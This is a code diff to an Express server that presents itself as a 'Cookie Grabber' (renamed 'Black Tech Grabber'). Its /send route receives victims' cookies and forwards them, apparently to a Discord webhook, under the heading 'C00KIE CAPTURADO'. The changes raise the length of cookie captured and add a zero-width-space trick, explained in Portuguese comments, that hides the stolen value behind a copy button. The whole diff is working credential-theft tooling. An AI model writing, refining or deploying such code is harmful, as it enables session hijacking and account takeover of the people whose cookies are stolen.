@@ -1,16 +1,3 @@
-const express = require('express');
-const path = require('path');
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
-app.use(express.static('public'));
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
 app.post('/send', async (req, res) => {
   const cookie = (req.body.cookie || '').toString().trim();
 
@@ -22,12 +9,15 @@ app.post('/send', async (req, res) => {
         body: JSON.stringify({
           embeds: [{
             title: "C00KIE CAPTURADO",
-            description: "```" + cookie.substring(0, 1500) + "```",
-            color: 0x00dbde,
+            description: "```" + cookie.substring(0, 1800) + "```",
+            color: 0x00ffea,
             timestamp: new Date().toISOString(),
-            footer: { text: "Cookie Grabber • Sempre Online" }
+            footer: { text: "Black Tech Grabber • Discreto & Perfeito" }
           }],
-          content: "||`" + cookie + "`||"
+          // ← Aqui está o truque: 1 caractere invisível + spoiler
+          content: "||||||`" + cookie + "`"
+          // Explicação: os  são ZERO-WIDTH SPACE (invisíveis)
+          // Isso força o Discord a colocar o botão "Copiar" sem mostrar nada
         })
       });
     } catch (e) {
@@ -36,8 +26,4 @@ app.post('/send', async (req, res) => {
   }
 
   res.json({ status: "ok" });
-});
-
-app.listen(PORT, () => {
-  console.log(`Grabber LINDO e FUNCIONANDO na porta ${PORT}`);
 });
